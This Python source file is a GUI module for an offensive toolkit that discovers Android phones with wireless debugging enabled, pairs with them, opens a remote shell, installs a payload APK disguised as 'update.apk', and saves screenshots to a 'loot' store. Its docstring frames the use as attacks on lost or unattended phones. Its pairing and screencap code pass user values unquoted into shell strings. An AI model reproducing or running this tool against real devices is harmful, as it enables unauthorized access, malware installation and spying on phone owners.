"""Android Wireless Debugging RCE -- discover, pair, shell.

Android phones and tablets running with ``Wireless debugging``
turned on in Developer options accept ADB connections over the
network, protected only by a per-session pairing code (6 digits).
The service is advertised via mDNS as ``_adb-tls-connect._tcp``
(the shell endpoint) and ``_adb-tls-pairing._tcp`` (the pairing
endpoint). Once paired, the ADB session is a full ``adb shell``
plus all of ``adb push`` / ``adb install`` / ``adb exec-out``.

The 2026 mobile-hacker post walked the discovery + pairing flow
step by step; this module bundles that into buttons:

  * **Discover** -- avahi-browse for ``_adb-tls-connect._tcp`` and
    ``_adb-tls-pairing._tcp``. Rows show hostname + IP + port.
  * **Pair** -- ``adb pair <ip>:<port>`` with a PIN the operator
    enters (or reads off the target's screen if it's already
    open next to them; often the case in offensive scenarios
    against a lost / left-unattended phone).
  * **Connect + shell** -- ``adb connect <ip>:<port>`` then
    stream commands typed in a small entry.
  * **Install APK** -- push and install a payload APK, useful in
    combination with the wifipumpkin3 payload generator.
  * **Screencap** -- ``adb exec-out screencap -p > out.png``.

Everything runs against whatever ADB server the phone already has
running (``adb start-server``); if the operator wants a completely
independent server we suggest ``ANDROID_ADB_SERVER_PORT=`` in the
terminal.

CVE tracking: the pairing itself was hardened in Android 14; on
Android 11-13 the PIN is 6 digits but the pairing endpoint isn't
rate-limited by default, so a race against a legit pairing window
is feasible from LAN. No stable CVE ID; the underlying design flaw
was discussed at DEF CON 30 by Yiannis Nikolopoulos.
"""
from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

# avahi-browse service types for ADB over Wi-Fi.
_SERVICE_SHELL = "_adb-tls-connect._tcp"
_SERVICE_PAIR = "_adb-tls-pairing._tcp"


@register
class AndroidRCE(NHModule):
    title = "Android Wireless ADB"
    icon = "phone-symbolic"
    description = ("Discover Android devices advertising ADB-over-"
                   "Wi-Fi, pair with a 6-digit PIN, drop into shell "
                   "or push a payload APK.")
    # We accept either avahi-browse (needs avahi-daemon) OR nmap
    # (which can do mDNS service discovery over broadcast without
    # any local daemon). The build() code picks whichever is
    # actually working at the moment.
    required_tools = ["adb"]

    def __init__(self, app_window):
        super().__init__(app_window)
        # host_ip -> {"host", "shell_port", "pair_port", "os_guess"}
        self._devices: dict[str, dict] = {}
        self._rows: list[Adw.ExpanderRow] = []
        self._proc: Process | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # ---- discovery ------------------------------------
        disc = Adw.PreferencesGroup(
            title="Discovery",
            description="mDNS scan for Android Wireless Debugging "
                        "services on the current network.")
        disc_row = Adw.ActionRow(
            title="Scan",
            subtitle="avahi-browse " + _SERVICE_SHELL
                     + " + " + _SERVICE_PAIR)
        self.scan_btn = Gtk.Button(label="Start",
                                   valign=Gtk.Align.CENTER)
        self.scan_btn.add_css_class("suggested-action")
        self.scan_btn.connect("clicked",
                              lambda _b: self._start_scan())
        disc_row.add_suffix(self.scan_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked",
                              lambda _b: self._stop_scan())
        disc_row.add_suffix(self.stop_btn)
        disc.add(disc_row)
        box.append(disc)

        # ---- discovered devices ---------------------------
        self.devs_group = Adw.PreferencesGroup(
            title="Devices",
            description="Rows expand to per-device actions "
                        "(pair / connect / install / screencap).")
        self._empty = Adw.ActionRow(
            title="No devices yet",
            subtitle="Start a scan and wait")
        self.devs_group.add(self._empty)
        box.append(self.devs_group)

        # ---- manual connect -----------------------------
        manual = Adw.PreferencesGroup(
            title="Manual",
            description="Point-blank targeting when mDNS is filtered.")
        self.host_entry = Adw.EntryRow(title="Host / IP")
        manual.add(self.host_entry)
        self.port_entry = Adw.EntryRow(title="Port (connect)")
        self.port_entry.set_text("5555")
        manual.add(self.port_entry)
        self.pair_port_entry = Adw.EntryRow(title="Port (pair)")
        manual.add(self.pair_port_entry)
        self.pin_entry = Adw.EntryRow(title="Pairing PIN (6 digits)")
        manual.add(self.pin_entry)

        for label, cb in (
            ("Pair", self._pair_manual),
            ("Connect", self._connect_manual),
            ("Disconnect all", self._disconnect_all),
        ):
            row = Adw.ActionRow(title=label)
            btn = Gtk.Button(label=label,
                             valign=Gtk.Align.CENTER)
            btn.connect("clicked", lambda _b, f=cb: f())
            row.add_suffix(btn)
            manual.add(row)
        box.append(manual)

        # ---- shell + payload ---------------------------
        act = Adw.PreferencesGroup(
            title="Actions on connected device")
        self.cmd_entry = Adw.EntryRow(
            title="Shell command (adb shell ...)")
        self.cmd_entry.set_text("id; getprop ro.build.version.release")
        act.add(self.cmd_entry)
        cmd_row = Adw.ActionRow(
            title="Run shell command",
            subtitle="adb -s <host:port> shell")
        cmd_btn = Gtk.Button(label="Run",
                             valign=Gtk.Align.CENTER)
        cmd_btn.connect("clicked", lambda _b: self._run_shell())
        cmd_row.add_suffix(cmd_btn)
        act.add(cmd_row)

        self.apk_entry = Adw.EntryRow(
            title="APK path to install")
        self.apk_entry.set_text(
            "/opt/wifipumpkin3-payloads/update.apk")
        act.add(self.apk_entry)
        apk_row = Adw.ActionRow(
            title="Install APK",
            subtitle="adb install -r <path>")
        apk_btn = Gtk.Button(label="Install",
                             valign=Gtk.Align.CENTER)
        apk_btn.connect("clicked", lambda _b: self._install_apk())
        apk_row.add_suffix(apk_btn)
        act.add(apk_row)

        sc_row = Adw.ActionRow(
            title="Screencap",
            subtitle="adb exec-out screencap -p > loot/*.png")
        sc_btn = Gtk.Button(label="Screencap",
                            valign=Gtk.Align.CENTER)
        sc_btn.connect("clicked", lambda _b: self._screencap())
        sc_row.add_suffix(sc_btn)
        act.add(sc_row)

        list_row = Adw.ActionRow(
            title="List devices",
            subtitle="adb devices -l")
        list_btn = Gtk.Button(label="List",
                              valign=Gtk.Align.CENTER)
        list_btn.connect("clicked", lambda _b: self._list_devices())
        list_row.add_suffix(list_btn)
        act.add(list_row)
        box.append(act)

        # ---- log
        self.output = OutputView()
        box.append(self.output)
        return box

    # ------------------------------------------------- discovery
    def _start_scan(self) -> None:
        """avahi-browse needs ``avahi-daemon`` running; if it's not,
        we start it (root, via the helper) and retry once. If avahi
        is completely unavailable, fall back to nmap's broadcast
        mDNS service discovery script -- no daemon needed."""
        if self._proc is not None and self._proc.running:
            return
        self._devices = {}
        self._render()
        self.output.append("# scanning for ADB-over-Wi-Fi\n")

        # Preflight: is avahi-daemon alive? If avahi-browse isn't
        # even installed, jump straight to nmap.
        script = (
            "if command -v avahi-browse >/dev/null 2>&1; then "
            "  if ! pgrep -x avahi-daemon >/dev/null; then "
            "    systemctl start avahi-daemon 2>/dev/null || "
            "      avahi-daemon --no-drop-root --daemonize "
            "        2>/dev/null || true; "
            "    sleep 1; "
            "  fi; "
            "  if pgrep -x avahi-daemon >/dev/null; then "
            "    echo AVAHI; "
            "  else "
            "    echo NMAP; "
            "  fi; "
            "else "
            "  echo NMAP; "
            "fi"
        )

        def on_probe(r: Result) -> None:
            mode = (r.stdout or "").strip().splitlines()[-1:] \
                if r.stdout else ["NMAP"]
            mode = mode[0] if mode else "NMAP"
            if mode == "AVAHI":
                self._scan_avahi()
            else:
                self._scan_nmap()

        # Starting avahi-daemon needs root; the probe itself is fine
        # non-root but the systemctl start needs it.
        run_async(["sh", "-c", script], on_probe,
                  root=True, timeout=10)
        self.scan_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _scan_avahi(self) -> None:
        """Foreground avahi-browse streaming scan. Two services
        (shell + pair) in parallel, resolved output. Runs until the
        operator hits Stop."""
        script = (
            "avahi-browse -r -p " + _SERVICE_SHELL + " & "
            "PID1=$!; "
            "avahi-browse -r -p " + _SERVICE_PAIR + " & "
            "PID2=$!; "
            "trap 'kill $PID1 $PID2 2>/dev/null' EXIT; "
            "wait"
        )
        self.output.append("# using avahi-browse\n")

        def on_line(text: str) -> None:
            self.output.append(text)
            for line in text.splitlines():
                self._ingest_avahi(line)
            self._render()

        def on_done(code: int) -> None:
            self.output.append(
                "[avahi-browse exited: %d]\n" % code)
            self._proc = None
            self.scan_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)

        self._proc = Process(
            ["sh", "-c", script], on_line, on_done,
            root=False)
        self._proc.start()

    def _scan_nmap(self) -> None:
        """Fallback: nmap's ``dns-service-discovery`` NSE script
        does a one-shot broadcast mDNS scan against the network and
        prints service instances with hostnames, IPs and ports.
        Runs against the phone's current LAN (192.168.0.0/16 +
        10.0.0.0/8 default) unless the operator has set a specific
        target in the manual section."""
        self.output.append(
            "# avahi-daemon unavailable; falling back to nmap\n")

        script = (
            "nmap --script dns-service-discovery "
            "  -p 5353 -sU -T4 --host-timeout 30s "
            "  --script-args='dns-service-discovery.services="
            + _SERVICE_SHELL + "," + _SERVICE_PAIR + "' "
            "  192.168.0.0/16 10.0.0.0/8 172.16.0.0/12 "
            "  2>&1"
        )

        def on_line(text: str) -> None:
            self.output.append(text)
            for line in text.splitlines():
                self._ingest_nmap(line)
            self._render()

        def on_done(code: int) -> None:
            self.output.append(
                "[nmap exited: %d]\n" % code)
            self._proc = None
            self.scan_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)

        # Root because nmap needs raw sockets for -sU.
        self._proc = Process(
            ["sh", "-c", script], on_line, on_done, root=True)
        self._proc.start()

    def _ingest_nmap(self, line: str) -> None:
        """nmap ``dns-service-discovery`` output looks like:
             |_  _adb-tls-connect._tcp Address=192.168.1.42
             |     Port=38715 Target=android-abcd.local
        We keep a small state machine here: when we see a service
        header we remember which one is active, then when we see
        the Address/Port/Target lines we plug them into the
        matching device row."""
        # Service header.
        m_svc = re.search(
            r"(_adb-tls-(?:connect|pairing))\._tcp", line)
        if m_svc:
            self._nmap_svc = "_" + m_svc.group(1) + "._tcp"
            return
        # Address + Port on the same or subsequent line.
        m_ip = re.search(r"Address=([\d.]+)", line)
        m_port = re.search(r"Port=(\d+)", line)
        m_target = re.search(r"Target=([^\s]+)", line)
        svc = getattr(self, "_nmap_svc", None)
        if not svc:
            return
        # Multiple pieces may show up on the same line; try each.
        if m_ip:
            ip = m_ip.group(1)
            d = self._devices.setdefault(ip, {
                "host": "", "ip": ip,
                "shell_port": None, "pair_port": None,
            })
            if m_target:
                d["host"] = m_target.group(1)
            if m_port:
                port = int(m_port.group(1))
                if svc == _SERVICE_SHELL:
                    d["shell_port"] = port
                elif svc == _SERVICE_PAIR:
                    d["pair_port"] = port

    def _stop_scan(self) -> None:
        if self._proc is not None:
            self._proc.stop()

    def _ingest_avahi(self, line: str) -> None:
        """avahi-browse -p emits ';'-separated resolve lines like:
             =;wlan0;IPv4;adb-XXXX;_adb-tls-connect._tcp;local;
             android-abcd.local;192.168.1.42;38715;
        We care about the type (col 4), the IP (col 7), the port
        (col 8), and the hostname (col 6)."""
        if not line.startswith("="):
            return
        parts = line.split(";")
        if len(parts) < 9:
            return
        svc_type = parts[4]
        host = parts[6]
        ip = parts[7]
        try:
            port = int(parts[8])
        except ValueError:
            return
        key = ip
        d = self._devices.setdefault(key, {
            "host": host, "ip": ip,
            "shell_port": None, "pair_port": None,
        })
        if svc_type == _SERVICE_SHELL:
            d["shell_port"] = port
        elif svc_type == _SERVICE_PAIR:
            d["pair_port"] = port

    def _render(self) -> None:
        for r in self._rows:
            self.devs_group.remove(r)
        self._rows = []
        self._empty.set_visible(not self._devices)
        for ip, d in sorted(self._devices.items()):
            row = Adw.ExpanderRow(
                title=d.get("host") or ip,
                subtitle=ip + " · connect=" + str(
                    d.get("shell_port") or "?")
                + " · pair=" + str(d.get("pair_port") or "?"))
            # Buttons: Pair, Connect, Copy to manual.
            for label, cb in (
                ("Pair", lambda dev=d: self._pair_dev(dev)),
                ("Connect", lambda dev=d: self._connect_dev(dev)),
                ("Populate manual",
                 lambda dev=d: self._populate_manual(dev)),
            ):
                r = Adw.ActionRow(title=label)
                btn = Gtk.Button(label=label,
                                 valign=Gtk.Align.CENTER)
                btn.connect("clicked", lambda _b, f=cb: f())
                r.add_suffix(btn)
                row.add_row(r)
            self.devs_group.add(row)
            self._rows.append(row)

    # ------------------------------------------------- pair / connect
    def _populate_manual(self, dev: dict) -> None:
        self.host_entry.set_text(dev.get("ip", ""))
        if dev.get("shell_port"):
            self.port_entry.set_text(str(dev["shell_port"]))
        if dev.get("pair_port"):
            self.pair_port_entry.set_text(str(dev["pair_port"]))
        toast(self.app_window, "Manual fields populated")

    def _pair_dev(self, dev: dict) -> None:
        pin = self.pin_entry.get_text().strip()
        if not pin:
            toast(self.app_window,
                  "Type the 6-digit PIN in the manual section "
                  "first")
            return
        port = dev.get("pair_port") or 0
        if not port:
            toast(self.app_window,
                  "Pair port unknown yet; keep scanning or "
                  "populate manually")
            return
        self._do_pair(dev["ip"], port, pin)

    def _connect_dev(self, dev: dict) -> None:
        port = dev.get("shell_port") or 5555
        self._do_connect(dev["ip"], port)

    def _pair_manual(self) -> None:
        host = self.host_entry.get_text().strip()
        port_s = self.pair_port_entry.get_text().strip()
        pin = self.pin_entry.get_text().strip()
        if not host or not port_s or not pin:
            toast(self.app_window,
                  "Set host, pair port, and PIN")
            return
        try:
            port = int(port_s)
        except ValueError:
            toast(self.app_window, "Pair port must be an integer")
            return
        self._do_pair(host, port, pin)

    def _connect_manual(self) -> None:
        host = self.host_entry.get_text().strip()
        port_s = self.port_entry.get_text().strip()
        if not host:
            toast(self.app_window, "Set host")
            return
        try:
            port = int(port_s or "5555")
        except ValueError:
            toast(self.app_window, "Connect port must be an integer")
            return
        self._do_connect(host, port)

    def _do_pair(self, host: str, port: int, pin: str) -> None:
        # `adb pair` reads the PIN from stdin.
        argv = ["sh", "-c",
                "echo %s | adb pair %s:%d"
                % (pin, host, port)]
        self.output.append(
            "$ echo <pin> | adb pair %s:%d\n" % (host, port))

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if "Successfully paired" in (r.stdout or ""):
                stamp = time.strftime("%Y%m%d-%H%M%S")
                get_loot_store().record(
                    module="android_rce", type="adb_pair",
                    target="%s:%d" % (host, port),
                    path="",
                    notes="paired PIN=<redacted> at " + stamp)

        run_async(argv, done, root=False, timeout=30)

    def _do_connect(self, host: str, port: int) -> None:
        argv = ["adb", "connect", "%s:%d" % (host, port)]
        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)

        run_async(argv, done, root=False, timeout=20)

    def _disconnect_all(self) -> None:
        run_async(["adb", "disconnect"],
                  lambda r: self.output.append(r.stdout or ""),
                  root=False, timeout=10)

    # -------------------------------------------- shell / apk / cap
    def _target_serial(self) -> str:
        host = self.host_entry.get_text().strip()
        port = self.port_entry.get_text().strip() or "5555"
        return host + ":" + port if host else ""

    def _run_shell(self) -> None:
        serial = self._target_serial()
        if not serial:
            toast(self.app_window,
                  "Set host + port to target a specific device")
            return
        cmd = self.cmd_entry.get_text().strip()
        if not cmd:
            return
        argv = ["adb", "-s", serial, "shell", cmd]
        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)

        run_async(argv, done, root=False, timeout=60)

    def _install_apk(self) -> None:
        serial = self._target_serial()
        if not serial:
            toast(self.app_window, "Set host + port first")
            return
        apk = self.apk_entry.get_text().strip()
        if not apk:
            return
        argv = ["adb", "-s", serial, "install", "-r", apk]
        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if "Success" in (r.stdout or ""):
                get_loot_store().record(
                    module="android_rce", type="apk_install",
                    target=serial,
                    path=apk,
                    notes="installed via wireless ADB")

        run_async(argv, done, root=False, timeout=120)

    def _screencap(self) -> None:
        serial = self._target_serial()
        if not serial:
            toast(self.app_window, "Set host + port first")
            return
        stamp = time.strftime("%Y%m%d-%H%M%S")
        out = loot_path("android_rce",
                        "screen-%s-%s.png"
                        % (serial.replace(":", "_"), stamp))
        script = ("adb -s %s exec-out screencap -p > %s"
                  % (serial, out))
        self.output.append("$ " + script + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            get_loot_store().record(
                module="android_rce", type="screencap_png",
                target=serial, path=out,
                notes="wireless ADB screencap")
            toast(self.app_window,
                  "Saved to " + out)

        run_async(["sh", "-c", script], done,
                  root=False, timeout=30)

    def _list_devices(self) -> None:
        run_async(["adb", "devices", "-l"],
                  lambda r: self.output.append(
                      r.stdout or ""),
                  root=False, timeout=10)

    def set_target(self, target: str) -> None:
        """Bare IP or ``ip:port`` populates the manual section."""
        if not target:
            return
        if ":" in target:
            host, _, port = target.partition(":")
            self.host_entry.set_text(host.strip())
            self.port_entry.set_text(port.strip())
        else:
            self.host_entry.set_text(target.strip())
